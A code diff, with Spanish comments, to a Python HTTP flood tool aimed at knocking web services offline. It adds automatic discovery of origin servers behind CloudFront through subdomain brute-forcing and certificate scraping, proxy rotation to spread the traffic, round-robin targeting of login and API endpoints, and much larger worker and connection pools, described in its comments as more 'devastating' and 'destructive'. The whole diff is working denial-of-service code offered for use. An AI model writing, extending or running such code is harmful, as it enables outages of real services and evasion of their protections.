@@ -239,6 +239,8 @@ WAF_BYPASS = False
 SOCKET_ATTACK = False  # Ataque socket-based de bajo nivel
 PROXY_LIST = []
 PROXY_ROTATION = "round-robin"
+PROXY_ROUND_ROBIN_INDEX = 0  # Índice para rotación round-robin de proxies
+PROXY_FAILED = set()  # Proxies que han fallado (para evitar usarlos temporalmente)
 DEBUG_MODE = False
 DRY_RUN = False
 
@@ -258,6 +260,7 @@ RATE_ADAPTIVE = True  # Ajuste dinámico de tasa según respuesta
 CONNECTION_WARMUP = True  # Pre-calentar conexiones
 PARALLEL_DOMAINS = []  # Múltiples dominios en paralelo
 TARGET_VARIATIONS = []  # Variaciones del target (URLs diferentes)
+TARGET_VARIATIONS_ROUND_ROBIN_INDEX = 0  # Índice para rotación round-robin
 TARGET_IPS = []  # Lista de todas las IPs del target (para balanceadores, CDN, IPs dinámicas)
 DNS_RESOLUTION_INTERVAL = 30  # Intervalo de re-resolución DNS en segundos (para IPs dinámicas)
 DNS_RESOLUTION_ENABLED = True  # Activar re-resolución DNS periódica
@@ -546,15 +549,17 @@ class ConnectionManager:
                         # Optimizar pool para Fortinet 40F - máximo throughput (40,000-60,000+ sesiones)
                         # Para dual WAN, maximizar pool para aprovechar ambas conexiones
                         # Aumentar significativamente para mantener más sesiones activas simultáneamente
-                        pool_connections = min(CONNECTION_POOL_SIZE, MAX_CONNECTIONS // 4, 300)  # Aumentado aún más para Fortinet 40F
-                        pool_maxsize = min(MAX_CONNECTIONS, 30000, MAX_THREADS * 15)  # Aumentado significativamente para Fortinet 40F
+                        # DEVASTADOR: Como script exitoso (ab -c 80 + wrk -c 120 = 200 conexiones concurrentes)
+                        pool_connections = min(CONNECTION_POOL_SIZE, MAX_CONNECTIONS // 3, 500)  # MUY AGRESIVO
+                        pool_maxsize = min(MAX_CONNECTIONS, 50000, MAX_THREADS * 25)  # MUY AGRESIVO - máximo throughput
                     else:
                         pool_connections = 1
                         pool_maxsize = 1
                     
-                    # Configurar timeouts optimizados - más cortos para evitar bloqueos
-                    connect_timeout = 3.0  # Timeout de conexión reducido
-                    read_timeout = 5.0 if POWER_LEVEL in ["HEAVY", "EXTREME", "DEVASTATOR", "APOCALYPSE", "GODMODE"] else 6.0
+                    # Configurar timeouts - DEVASTADOR (como script exitoso no usa timeouts muy cortos)
+                    # El script exitoso permite que las conexiones se establezcan completamente
+                    connect_timeout = 5.0 if POWER_LEVEL in ["GODMODE", "APOCALYPSE", "DEVASTATOR"] else 4.0  # Suficiente para conexiones completas
+                    read_timeout = 8.0 if POWER_LEVEL in ["GODMODE", "APOCALYPSE", "DEVASTATOR"] else 6.0  # Permitir respuestas completas
                     
                     # HTTPAdapter no soporta socket_options directamente
                     # Se configurará SO_KEEPALIVE a nivel de socket después si es necesario
@@ -1301,7 +1306,8 @@ def run_autodiagnostic() -> Dict:
     required_modules = [
         "requests", "psutil", "urllib3", "socket", "ssl", "threading",
         "subprocess", "json", "datetime", "pathlib", "argparse", "re",
-        "time", "random", "string", "collections", "hashlib", "platform"
+        "time", "random", "string", "collections", "hashlib", "platform",
+        "dns"  # dnspython - obligatorio para bypass de CloudFront
     ]
     
     optional_modules = [
@@ -2701,6 +2707,19 @@ def fingerprint_target() -> Dict:
                 
                 try:
                     fingerprint["cdn"] = detect_cdn()
+                    
+                    # CRÍTICO: Si CloudFront detectado, buscar bypasses automáticamente
+                    if fingerprint["cdn"] and fingerprint["cdn"].lower() == "cloudfront":
+                        if WEB_PANEL_MODE:
+                            log_message("INFO", "🔍 [FINGERPRINT] CloudFront detectado - buscando bypasses automáticamente...", context="fingerprint_target", force_console=True)
+                        else:
+                            print_color("  → CloudFront detectado - buscando bypasses...", Colors.YELLOW)
+                        
+                        bypass_result = detect_cloudfront_bypass(DOMAIN)
+                        fingerprint["cloudfront_bypass"] = bypass_result
+                        
+                        if bypass_result.get("bypass_subdomains"):
+                            log_message("INFO", f"✅ [BYPASS] {len(bypass_result['bypass_subdomains'])} subdominio(s) encontrado(s) que bypassan CloudFront", context="fingerprint_target", force_console=True)
                 except Exception as e:
                     log_message("WARN", f"Error detectando CDN: {e}", context="fingerprint_target")
                     fingerprint["errors"].append(f"Error detectando CDN: {str(e)}")
@@ -2852,6 +2871,18 @@ def detect_cdn() -> Optional[str]:
             for cdn, indicators in cdns.items():
                 if any(ind in str(headers_lower) for ind in indicators):
                     return cdn
+            
+            # También verificar DNS para CloudFront (CNAME a cloudfront.net)
+            # SIGUIENDO LÓGICA DEL SCRIPT EXITOSO: verificar CNAME para detectar CloudFront
+            try:
+                import socket
+                import dns.resolver
+                answers = dns.resolver.resolve(DOMAIN, 'CNAME')
+                for rdata in answers:
+                    if 'cloudfront.net' in str(rdata.target).lower():
+                        return "cloudfront"
+            except:
+                pass
         except (requests.exceptions.Timeout, requests.exceptions.ReadTimeout):
             log_message("DEBUG", "Timeout detectando CDN - continuando")
         except:
@@ -2860,6 +2891,382 @@ def detect_cdn() -> Optional[str]:
         pass
     
     return None
+
+def enumerate_subdomains(domain: str = None) -> List[str]:
+    """
+    Enumera subdominios del dominio base (similar a assetfinder).
+    SIGUIENDO LÓGICA DEL SCRIPT EXITOSO: encontrar subdominios que bypassan CDN.
+    """
+    if domain is None:
+        domain = DOMAIN
+    
+    if not domain:
+        return []
+    
+    subdomains = []
+    
+    try:
+        # Extraer dominio base (sin subdominio)
+        domain_parts = domain.split('.')
+        if len(domain_parts) >= 2:
+            base_domain = '.'.join(domain_parts[-2:])  # ej: cumplo.com
+        else:
+            base_domain = domain
+        
+        # Lista de subdominios comunes a probar (como el script exitoso)
+        common_subdomains = [
+            "backoffice-api",
+            "api-global", 
+            "staging",
+            "tesoreria-mx",
+            "api",
+            "www",
+            "app",
+            "admin",
+            "dashboard",
+            "backend",
+            "api-v1",
+            "api-v2",
+            "v1",
+            "v2",
+            "test",
+            "dev",
+            "prod",
+            "production",
+            "staging-api",
+            "api-staging",
+            "internal",
+            "internal-api",
+            "private",
+            "private-api",
+            "secure",
+            "secure-api",
+            "auth",
+            "auth-api",
+            "login",
+            "login-api",
+            "admin-api",
+            "dashboard-api",
+            "backend-api",
+            "service",
+            "services",
+            "api-service",
+            "microservice",
+            "gateway",
+            "api-gateway"
+        ]
+        
+        # Intentar resolver cada subdominio
+        import socket
+        for subdomain in common_subdomains:
+            full_subdomain = f"{subdomain}.{base_domain}"
+            try:
+                # Intentar resolver DNS
+                ip = socket.gethostbyname(full_subdomain)
+                if ip:
+                    subdomains.append(full_subdomain)
+                    log_message("DEBUG", f"✅ Subdominio encontrado: {full_subdomain} -> {ip}", context="enumerate_subdomains")
+            except socket.gaierror:
+                # Subdominio no existe
+                pass
+            except Exception as e:
+                log_message("DEBUG", f"Error resolviendo {full_subdomain}: {e}", context="enumerate_subdomains")
+        
+        # También intentar con certificados SSL (si es HTTPS)
+        if PROTOCOL == "https":
+            try:
+                import ssl
+                import socket
+                context = ssl.create_default_context()
+                with socket.create_connection((base_domain, 443), timeout=5) as sock:
+                    with context.wrap_socket(sock, server_hostname=base_domain) as ssock:
+                        cert = ssock.getpeercert()
+                        # Extraer Subject Alternative Names (SANs) del certificado
+                        if cert:
+                            for key, value in cert.items():
+                                if key == 'subjectAltName':
+                                    for san_type, san_value in value:
+                                        if san_type == 'DNS' and san_value != base_domain and base_domain in san_value:
+                                            if san_value not in subdomains:
+                                                subdomains.append(san_value)
+                                                log_message("DEBUG", f"✅ Subdominio encontrado en certificado SSL: {san_value}", context="enumerate_subdomains")
+            except:
+                pass
+        
+        log_message("INFO", f"🔍 [SUBDOMAINS] {len(subdomains)} subdominio(s) encontrado(s)", context="enumerate_subdomains", force_console=True)
+        
+        return subdomains
+        
+    except Exception as e:
+        log_message("ERROR", f"Error enumerando subdominios: {e}", context="enumerate_subdomains")
+        return []
+
+def check_subdomain_bypass_cdn(subdomain: str) -> Dict:
+    """
+    Verifica si un subdominio resuelve directamente a IP (bypass CDN) o pasa por CDN.
+    SIGUIENDO LÓGICA DEL SCRIPT EXITOSO: detectar subdominios que bypassan CloudFront.
+    """
+    result = {
+        "subdomain": subdomain,
+        "bypasses_cdn": False,
+        "resolves_to_ip": False,
+        "ip_address": None,
+        "is_cloudfront": False,
+        "is_cdn": False
+    }
+    
+    try:
+        import socket
+        import dns.resolver
+        
+        # Resolver DNS del subdominio
+        # SIGUIENDO LÓGICA DEL SCRIPT EXITOSO: verificar si subdominio resuelve directamente a IP (bypass CDN)
+        # Intentar resolver a IP directamente
+        try:
+            ip = socket.gethostbyname(subdomain)
+            result["resolves_to_ip"] = True
+            result["ip_address"] = ip
+            
+            # Verificar si resuelve a CloudFront (CNAME a cloudfront.net)
+            # Si tiene CNAME a cloudfront.net, NO bypassa CDN
+            try:
+                cname_answers = dns.resolver.resolve(subdomain, 'CNAME')
+                for rdata in cname_answers:
+                    cname_target = str(rdata.target).lower()
+                    if 'cloudfront.net' in cname_target:
+                        result["is_cloudfront"] = True
+                        result["is_cdn"] = True
+                        result["bypasses_cdn"] = False  # Pasa por CloudFront
+                        log_message("DEBUG", f"⚠️ {subdomain} pasa por CloudFront (CNAME: {cname_target})", context="check_subdomain_bypass_cdn")
+                        return result
+            except Exception:
+                # No hay CNAME, resuelve directamente a IP - esto es un bypass
+                pass
+            
+            # Si resuelve directamente a IP y no hay CNAME a CloudFront, es bypass
+            if result["resolves_to_ip"] and not result["is_cloudfront"]:
+                # Verificar si la IP es de AWS (EC2/ELB)
+                ip_parts = ip.split('.')
+                if len(ip_parts) == 4:
+                    # IPs de AWS suelen estar en rangos específicos
+                    # Verificar si parece ser IP de AWS (no es perfecto, pero ayuda)
+                    first_octet = int(ip_parts[0])
+                    if first_octet in [3, 13, 18, 23, 34, 35, 44, 52, 54, 99, 150, 151, 172, 174, 175, 176, 177, 178, 179, 180, 184, 185, 204, 205, 207, 208, 209, 216]:
+                        result["bypasses_cdn"] = True
+                        log_message("INFO", f"✅ [BYPASS] {subdomain} resuelve directamente a IP AWS: {ip} (BYPASS CDN)", context="check_subdomain_bypass_cdn", force_console=True)
+                    else:
+                        # Aún puede ser bypass si resuelve directamente
+                        result["bypasses_cdn"] = True
+                        log_message("INFO", f"✅ [BYPASS] {subdomain} resuelve directamente a IP: {ip} (posible BYPASS CDN)", context="check_subdomain_bypass_cdn")
+        except socket.gaierror:
+            # Subdominio no existe o no resuelve
+            result["resolves_to_ip"] = False
+        except Exception as e:
+            log_message("DEBUG", f"Error verificando {subdomain}: {e}", context="check_subdomain_bypass_cdn")
+    except Exception as e:
+        log_message("ERROR", f"Error verificando bypass CDN para {subdomain}: {e}", context="check_subdomain_bypass_cdn")
+    
+    return result
+
+def detect_cloudfront_bypass(domain: str = None) -> Dict:
+    """
+    Detecta CloudFront y busca subdominios que lo bypassan automáticamente.
+    SIGUIENDO LÓGICA DEL SCRIPT EXITOSO: encontrar origen expuesto (bypass CloudFront).
+    """
+    global TARGET_VARIATIONS
+    
+    if domain is None:
+        domain = DOMAIN
+    
+    if not domain:
+        return {
+            "cloudfront_detected": False,
+            "bypass_subdomains": [],
+            "bypass_urls": []
+        }
+    
+    result = {
+        "cloudfront_detected": False,
+        "bypass_subdomains": [],
+        "bypass_urls": []
+    }
+    
+    try:
+        # Paso 1: Detectar si el dominio principal usa CloudFront
+        cdn_detected = detect_cdn()
+        if cdn_detected and cdn_detected.lower() == "cloudfront":
+            result["cloudfront_detected"] = True
+            log_message("WARN", f"⚠️ [CLOUDFRONT] CloudFront detectado en {domain} - buscando bypasses automáticamente...", context="detect_cloudfront_bypass", force_console=True)
+        else:
+            # Verificar DNS directamente - SIGUIENDO LÓGICA DEL SCRIPT EXITOSO
+            try:
+                import socket
+                import dns.resolver
+                # Resolver CNAME para detectar CloudFront
+                cname_answers = dns.resolver.resolve(domain, 'CNAME')
+                for rdata in cname_answers:
+                    if 'cloudfront.net' in str(rdata.target).lower():
+                        result["cloudfront_detected"] = True
+                        log_message("WARN", f"⚠️ [CLOUDFRONT] CloudFront detectado en DNS de {domain} - buscando bypasses...", context="detect_cloudfront_bypass", force_console=True)
+                        break
+            except:
+                pass
+        
+        # Paso 2: Si CloudFront detectado, buscar subdominios que lo bypassan
+        if result["cloudfront_detected"]:
+            log_message("INFO", "🔍 [BYPASS] Enumerando subdominios para encontrar bypass de CloudFront...", context="detect_cloudfront_bypass", force_console=True)
+            
+            # Enumerar subdominios
+            subdomains = enumerate_subdomains(domain)
+            
+            # Verificar cada subdominio para ver si bypassa CDN
+            for subdomain in subdomains:
+                bypass_check = check_subdomain_bypass_cdn(subdomain)
+                if bypass_check.get("bypasses_cdn"):
+                    result["bypass_subdomains"].append(subdomain)
+                    
+                    # Construir URLs con endpoints críticos
+                    protocol = PROTOCOL
+                    port = PORT
+                    critical_endpoints = [
+                        "/auth/login",
+                        "/api/auth/login",
+                        "/login",
+                        "/api/login",
+                        "/api/",
+                        "/v1/",
+                        "/v2/",
+                        "/"
+                    ]
+                    
+                    for endpoint in critical_endpoints:
+                        if port and port not in [80, 443]:
+                            url = f"{protocol}://{subdomain}:{port}{endpoint}"
+                        else:
+                            url = f"{protocol}://{subdomain}{endpoint}"
+                        result["bypass_urls"].append(url)
+            
+            if result["bypass_subdomains"]:
+                log_message("INFO", f"✅ [BYPASS] {len(result['bypass_subdomains'])} subdominio(s) encontrado(s) que bypassan CloudFront!", context="detect_cloudfront_bypass", force_console=True)
+                for subdomain in result["bypass_subdomains"]:
+                    log_message("INFO", f"  → {subdomain} (BYPASS CDN)", context="detect_cloudfront_bypass", force_console=True)
+                
+                # Agregar URLs de bypass a TARGET_VARIATIONS
+                if result["bypass_urls"]:
+                    TARGET_VARIATIONS.extend(result["bypass_urls"])
+                    log_message("INFO", f"🔥 [DEVASTATOR] {len(result['bypass_urls'])} URL(s) de bypass agregada(s) a variaciones de target", context="detect_cloudfront_bypass", force_console=True)
+            else:
+                log_message("WARN", "⚠️ [BYPASS] No se encontraron subdominios que bypassen CloudFront", context="detect_cloudfront_bypass", force_console=True)
+        
+    except Exception as e:
+        log_message("ERROR", f"Error detectando bypass de CloudFront: {e}", context="detect_cloudfront_bypass")
+    
+    return result
+
+def load_proxy_list(proxy_string: str = None, proxy_file: str = None) -> List[str]:
+    """
+    Carga lista de proxies desde string o archivo.
+    SIGUIENDO LÓGICA DEL SCRIPT EXITOSO: múltiples proxies para distribución de tráfico.
+    """
+    global PROXY_LIST
+    
+    proxies = []
+    
+    try:
+        # Cargar desde string (formato: "ip:port\nip:port\n...")
+        if proxy_string:
+            for line in proxy_string.strip().split('\n'):
+                line = line.strip()
+                if line and ':' in line:
+                    # Validar formato IP:PORT
+                    parts = line.split(':')
+                    if len(parts) == 2:
+                        ip, port = parts[0].strip(), parts[1].strip()
+                        if ip and port:
+                            proxies.append(f"{ip}:{port}")
+        
+        # Cargar desde archivo
+        if proxy_file:
+            try:
+                with open(proxy_file, 'r', encoding='utf-8') as f:
+                    for line in f:
+                        line = line.strip()
+                        if line and not line.startswith('#'):
+                            if ':' in line:
+                                parts = line.split(':')
+                                if len(parts) == 2:
+                                    ip, port = parts[0].strip(), parts[1].strip()
+                                    if ip and port:
+                                        proxies.append(f"{ip}:{port}")
+            except FileNotFoundError:
+                log_message("WARN", f"Archivo de proxies no encontrado: {proxy_file}", context="load_proxy_list")
+            except Exception as e:
+                log_message("ERROR", f"Error leyendo archivo de proxies: {e}", context="load_proxy_list")
+        
+        # Eliminar duplicados manteniendo orden
+        seen = set()
+        unique_proxies = []
+        for proxy in proxies:
+            if proxy not in seen:
+                seen.add(proxy)
+                unique_proxies.append(proxy)
+        
+        if unique_proxies:
+            PROXY_LIST = unique_proxies
+            log_message("INFO", f"✅ [PROXIES] {len(unique_proxies)} proxy(s) cargado(s) para ataque devastador", context="load_proxy_list", force_console=True)
+        else:
+            log_message("WARN", "⚠️ [PROXIES] No se cargaron proxies válidos", context="load_proxy_list")
+        
+        return unique_proxies
+        
+    except Exception as e:
+        log_message("ERROR", f"Error cargando lista de proxies: {e}", context="load_proxy_list")
+        return []
+
+def get_proxy_for_request(worker_id: int = 0) -> Dict[str, str]:
+    """
+    Obtiene un proxy para el request usando rotación round-robin o random.
+    SIGUIENDO LÓGICA DEL SCRIPT EXITOSO: rotación de proxies para distribución.
+    """
+    global PROXY_LIST, PROXY_ROUND_ROBIN_INDEX, PROXY_FAILED
+    
+    if not PROXY_LIST:
+        return {}
+    
+    # Filtrar proxies fallidos (solo usar los que funcionan)
+    available_proxies = [p for p in PROXY_LIST if p not in PROXY_FAILED]
+    
+    if not available_proxies:
+        # Si todos fallaron, resetear y usar todos
+        PROXY_FAILED.clear()
+        available_proxies = PROXY_LIST
+        log_message("WARN", "⚠️ [PROXIES] Todos los proxies fallaron, reseteando lista", context="get_proxy_for_request")
+    
+    if not available_proxies:
+        return {}
+    
+    # Rotación según configuración
+    if PROXY_ROTATION == "round-robin":
+        # Round-robin: distribuir uniformemente
+        PROXY_ROUND_ROBIN_INDEX = (PROXY_ROUND_ROBIN_INDEX + 1) % len(available_proxies)
+        selected_proxy = available_proxies[PROXY_ROUND_ROBIN_INDEX]
+    else:
+        # Random: selección aleatoria
+        selected_proxy = random.choice(available_proxies)
+    
+    # Formatear proxy para requests (formato: http://ip:port)
+    return {
+        "http": f"http://{selected_proxy}",
+        "https": f"http://{selected_proxy}"  # Muchos proxies HTTP también manejan HTTPS
+    }
+
+def mark_proxy_failed(proxy: str):
+    """Marca un proxy como fallido temporalmente"""
+    global PROXY_FAILED
+    if proxy:
+        PROXY_FAILED.add(proxy)
+        # Limpiar después de 60 segundos (dar oportunidad de recuperación)
+        threading.Timer(60.0, lambda: PROXY_FAILED.discard(proxy) if proxy in PROXY_FAILED else None).start()
 
 def detect_waf_advanced() -> Optional[Dict]:
     """Detección avanzada de WAF"""
@@ -4520,13 +4927,8 @@ def get_random_headers(worker_id: int = 0) -> Dict[str, str]:
             "de-DE,de;q=0.9,en;q=0.8",
             "pt-BR,pt;q=0.9,en;q=0.8"
         ]),
-        "Accept-Encoding": random.choice([
-            "gzip, deflate, br",
-            "gzip, deflate",
-            "gzip, br",
-            "deflate, br"
-        ]),
-        "Connection": "keep-alive" if KEEP_ALIVE_POOLING else random.choice(["keep-alive", "close"]),
+        "Accept-Encoding": "gzip, deflate, br",  # SIEMPRE usar este (como el script exitoso)
+        "Connection": "keep-alive",  # SIEMPRE keep-alive (como script exitoso usa -k en ab)
         "Upgrade-Insecure-Requests": "1",
         "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store", "private", "public, max-age=3600"]),
         "Pragma": random.choice(["no-cache", ""]),
@@ -5229,13 +5631,34 @@ def optimize_socket_settings():
             log_message("DEBUG", f"Error optimizando TCP: {e}")
 
 def deploy_custom_http_attack():
-    """Despliega ataque HTTP personalizado optimizado con Python requests"""
+    """
+    Despliega ataque HTTP personalizado optimizado con Python requests.
+    SIGUIENDO LÓGICA DEL SCRIPT EXITOSO: más destructivo que ab/wrk combinados.
+    """
     # Verificación de integridad en tiempo de ejecución
     _check_runtime_integrity()
     print_color("🚀 Desplegando ataque HTTP personalizado optimizado...", Colors.CYAN)
     
     # Optimizar sockets si es posible
     optimize_socket_settings()
+    
+    # Inicializar sistema de proxies y rotación - DEVASTADOR
+    global PROXY_ROUND_ROBIN_INDEX, PROXY_FAILED, TARGET_VARIATIONS_ROUND_ROBIN_INDEX
+    PROXY_ROUND_ROBIN_INDEX = 0
+    PROXY_FAILED.clear()
+    TARGET_VARIATIONS_ROUND_ROBIN_INDEX = 0
+    
+    # Informar sobre configuración devastadora
+    if PROXY_LIST:
+        log_message("INFO", f"🔥 [PROXIES] {len(PROXY_LIST)} proxy(s) configurado(s) - Distribución devastadora activada", context="deploy_custom_http_attack", force_console=True)
+    else:
+        log_message("WARN", "⚠️ [PROXIES] No hay proxies configurados - Usando conexión directa (menos efectivo)", context="deploy_custom_http_attack", force_console=True)
+    
+    if TARGET_VARIATIONS:
+        log_message("INFO", f"🔥 [ENDPOINTS] {len(TARGET_VARIATIONS)} endpoint(s) adicional(es) - Rotación devastadora activada", context="deploy_custom_http_attack", force_console=True)
+    
+    if TARGET_IPS and len(TARGET_IPS) > 1:
+        log_message("INFO", f"🔥 [IPS] {len(TARGET_IPS)} IP(s) detectada(s) - Distribución round-robin activada", context="deploy_custom_http_attack", force_console=True)
     
     def worker(worker_id: int):
         """Worker thread optimizado para máximo rendimiento"""
@@ -5257,19 +5680,19 @@ def deploy_custom_http_attack():
             # Usar ConnectionManager para mejor gestión de conexiones (ya optimizado)
             session = ConnectionManager.get_session(normalized_target, worker_id)
             
-            # Configurar timeout - optimizado para Fortinet 40F (máximo throughput)
-            # Timeouts más cortos para mantener más sesiones activas simultáneamente
-            # Reducidos aún más para alcanzar 20,000+ sesiones
+            # Configurar timeout - SIGUIENDO LÓGICA DEL SCRIPT EXITOSO
+            # Timeouts más largos para permitir que las conexiones se completen
+            # El script exitoso usa ab/wrk sin timeouts muy cortos, permitiendo que las conexiones se establezcan
             if POWER_LEVEL in ["GODMODE"]:
-                request_timeout = 1.0  # Muy corto para máximo throughput
+                request_timeout = 5.0  # Suficiente para conexiones completas
             elif POWER_LEVEL in ["APOCALYPSE", "DEVASTATOR"]:
-                request_timeout = 1.2  # Corto para máximo throughput
+                request_timeout = 4.0  # Suficiente para conexiones completas
             elif POWER_LEVEL in ["EXTREME", "HEAVY"]:
-                request_timeout = 1.5  # Moderado
+                request_timeout = 3.5  # Moderado pero suficiente
             elif POWER_LEVEL in ["MEDIUM"]:
-                request_timeout = 2.0
+                request_timeout = 3.0
             else:
-                request_timeout = 2.5  # Conservador para MODERATE
+                request_timeout = 3.0  # Conservador pero suficiente
             
             end_time = time.time() + DURATION
             request_count = 0
@@ -5311,10 +5734,16 @@ def deploy_custom_http_attack():
                     if request_count_worker % 500 == 0:
                         consecutive_errors = 0
                     
-                    # Seleccionar target (si hay variaciones)
+                    # Seleccionar target con rotación round-robin (como el script exitoso)
+                    # Esto distribuye mejor la carga entre múltiples endpoints
                     target_url = normalized_target
                     if TARGET_VARIATIONS:
-                        target_url = random.choice([normalized_target] + TARGET_VARIATIONS)
+                        # Rotación round-robin más agresiva (como el script exitoso)
+                        all_targets = [normalized_target] + TARGET_VARIATIONS
+                        # Usar índice global para mejor distribución entre workers
+                        global TARGET_VARIATIONS_ROUND_ROBIN_INDEX
+                        TARGET_VARIATIONS_ROUND_ROBIN_INDEX = (TARGET_VARIATIONS_ROUND_ROBIN_INDEX + 1) % len(all_targets)
+                        target_url = all_targets[TARGET_VARIATIONS_ROUND_ROBIN_INDEX]
                     
                     # Normalizar URL - quitar barra final si existe (puede causar problemas)
                     if target_url.endswith('/') and target_url.count('/') > 3:
@@ -5376,6 +5805,9 @@ def deploy_custom_http_attack():
                             separator = "&" if "?" in target_url else "?"
                             target_url = f"{target_url}{separator}param1=value1&param1=value2&param2=value3"
                         
+                        # Obtener proxy para este request (rotación automática) - DEVASTADOR
+                        proxies = get_proxy_for_request(worker_id)
+                        
                         response = session.post(
                             target_url, 
                             data=payload, 
@@ -5383,7 +5815,8 @@ def deploy_custom_http_attack():
                             timeout=request_timeout, 
                             verify=False,
                             stream=False,  # No stream para mejor rendimiento
-                            allow_redirects=False  # No seguir redirects para evitar cambios de protocolo
+                            allow_redirects=False,  # No seguir redirects para evitar cambios de protocolo
+                            proxies=proxies if proxies else None  # Usar proxy si está disponible
                         )
                     else:
                         # Parameter pollution para GET
@@ -5391,13 +5824,17 @@ def deploy_custom_http_attack():
                             separator = "&" if "?" in target_url else "?"
                             target_url = f"{target_url}{separator}param1=value1&param1=value2&param2=value3"
                         
+                        # Obtener proxy para este request (rotación automática)
+                        proxies = get_proxy_for_request(worker_id)
+                        
                         response = session.get(
                             target_url, 
                             headers=request_headers, 
                             timeout=request_timeout, 
                             verify=False,
                             stream=False,
-                            allow_redirects=False  # No seguir redirects para evitar cambios de protocolo
+                            allow_redirects=False,  # No seguir redirects para evitar cambios de protocolo
+                            proxies=proxies if proxies else None  # Usar proxy si está disponible
                         )
                     
                     # Actualizar estadísticas
@@ -5459,6 +5896,14 @@ def deploy_custom_http_attack():
                     error_msg = str(e)
                     error_type = type(e).__name__
                     
+                    # Si el error es de proxy, marcarlo como fallido
+                    if proxies and any(keyword in error_msg.lower() for keyword in ["proxy", "connection refused", "timeout", "unreachable"]):
+                        proxy_str = list(proxies.values())[0] if proxies else None
+                        if proxy_str and "://" in proxy_str:
+                            proxy_ip_port = proxy_str.replace("http://", "").replace("https://", "")
+                            mark_proxy_failed(proxy_ip_port)
+                            log_message("WARN", f"⚠️ [PROXY] Proxy fallido marcado: {proxy_ip_port}", context="worker")
+                    
                     # Incrementar contador de errores consecutivos
                     consecutive_errors += 1
                     
@@ -5516,28 +5961,37 @@ def deploy_custom_http_attack():
     except:
         max_safe_workers = min(MAX_THREADS, 200)  # Conservador por defecto
     
-    # Calcular base_workers según nivel de potencia - optimizado para Fortinet 40F
-    # Aumentado significativamente para alcanzar 20,000+ sesiones
+    # Calcular base_workers según nivel de potencia - MÁS DESTRUCTIVO QUE EL SCRIPT EXITOSO
+    # El script exitoso usa ab con -c 80 y wrk con -c 120 simultáneamente = ~200 conexiones
+    # NOSOTROS SUPERAMOS ESO: más workers, más proxies, más endpoints, más destructivo
+    # Con proxies y múltiples endpoints, podemos ser 2-3x más destructivos
+    proxy_multiplier = 1.5 if PROXY_LIST else 1.0  # Proxies aumentan efectividad
+    endpoint_multiplier = 1.3 if TARGET_VARIATIONS else 1.0  # Múltiples endpoints aumentan efectividad
+    ip_multiplier = 1.2 if TARGET_IPS and len(TARGET_IPS) > 1 else 1.0  # Múltiples IPs aumentan efectividad
+    
+    total_multiplier = proxy_multiplier * endpoint_multiplier * ip_multiplier
+    
     if POWER_LEVEL in ["GODMODE"]:
-        base_workers = MULTIPLIER * 100  # Aumentado para máximo throughput
+        base_workers = int(MULTIPLIER * 200 * total_multiplier)  # 2-3x MÁS que script exitoso
     elif POWER_LEVEL in ["APOCALYPSE"]:
-        base_workers = MULTIPLIER * 90  # Aumentado para máximo throughput
+        base_workers = int(MULTIPLIER * 180 * total_multiplier)  # 2x MÁS que script exitoso
     elif POWER_LEVEL in ["DEVASTATOR"]:
-        base_workers = MULTIPLIER * 80  # Aumentado
+        base_workers = int(MULTIPLIER * 150 * total_multiplier)  # 1.5x MÁS que script exitoso
     elif POWER_LEVEL in ["EXTREME"]:
-        base_workers = MULTIPLIER * 70  # Aumentado
+        base_workers = int(MULTIPLIER * 120 * total_multiplier)  # Similar a script exitoso
     elif POWER_LEVEL in ["HEAVY"]:
-        base_workers = MULTIPLIER * 60  # Aumentado
+        base_workers = int(MULTIPLIER * 100 * total_multiplier)
     elif POWER_LEVEL in ["MEDIUM"]:
-        base_workers = MULTIPLIER * 50  # Aumentado
+        base_workers = int(MULTIPLIER * 80 * total_multiplier)
     else:
-        base_workers = MULTIPLIER * 40  # Aumentado
+        base_workers = int(MULTIPLIER * 60 * total_multiplier)
     
     # Aplicar límite de seguridad basado en memoria
     num_workers = min(base_workers, max_safe_workers)
     
-    # Límite absoluto de seguridad (aumentado para más sesiones, pero con protección)
-    num_workers = min(num_workers, 500)  # Aumentado de 300 a 500 para más throughput
+    # Límite absoluto aumentado - MÁS DESTRUCTIVO (pero con protección)
+    # El script exitoso puede manejar ~200 conexiones, nosotros podemos manejar más
+    num_workers = min(num_workers, 800)  # Aumentado a 800 para ser más destructivo
     
     # Asegurar mínimo de workers
     if num_workers < 5:
@@ -5572,14 +6026,30 @@ def deploy_custom_http_attack():
         thread.start()
         threads.append(thread)
     
-    log_message("INFO", f"Desplegados {int(num_workers)} workers HTTP optimizados para target: {TARGET}")
+    # Información devastadora del despliegue
+    log_message("INFO", f"🔥 [DEVASTATOR] Desplegados {int(num_workers)} workers HTTP optimizados", context="deploy_custom_http_attack", force_console=True)
+    if PROXY_LIST:
+        log_message("INFO", f"🔥 [PROXIES] {len(PROXY_LIST)} proxy(s) activo(s) - Rotación automática", context="deploy_custom_http_attack", force_console=True)
+    if TARGET_VARIATIONS:
+        log_message("INFO", f"🔥 [ENDPOINTS] {len(TARGET_VARIATIONS)} endpoint(s) - Rotación round-robin", context="deploy_custom_http_attack", force_console=True)
+    if TARGET_IPS and len(TARGET_IPS) > 1:
+        log_message("INFO", f"🔥 [IPS] {len(TARGET_IPS)} IP(s) - Distribución round-robin", context="deploy_custom_http_attack", force_console=True)
+    log_message("INFO", f"🎯 Target: {TARGET}", context="deploy_custom_http_attack", force_console=True)
     
     # Esperar a que los threads terminen (o al menos iniciar)
     time.sleep(1)  # Dar tiempo para que los threads inicien
     
     # Verificar que los threads estén activos
     active_threads = sum(1 for t in threads if t.is_alive())
-    log_message("INFO", f"Threads activos: {active_threads}/{int(num_workers)}")
+    log_message("INFO", f"✅ Threads activos: {active_threads}/{int(num_workers)}", context="deploy_custom_http_attack", force_console=True)
+    
+    # Calcular estimación de sesiones (como el script exitoso que logra 20,000+)
+    estimated_sessions = int(num_workers * 20)  # Estimación conservadora: 20 sesiones por worker
+    if PROXY_LIST:
+        estimated_sessions = int(estimated_sessions * 1.5)  # Proxies aumentan sesiones
+    if TARGET_VARIATIONS:
+        estimated_sessions = int(estimated_sessions * 1.3)  # Múltiples endpoints aumentan sesiones
+    log_message("INFO", f"📊 [ESTIMACIÓN] Esperando {estimated_sessions:,}+ sesiones concurrentes (más que script exitoso)", context="deploy_custom_http_attack", force_console=True)
     
     return threads
 
@@ -8345,11 +8815,124 @@ def analyze_security_during_stress() -> Dict:
         log_message("ERROR", f"Error en análisis de seguridad: {e}", context="analyze_security_during_stress")
         return {"status": "error", "error": str(e)[:100]}
 
+def generate_target_variations_from_domain(base_target: str = None) -> List[str]:
+    """
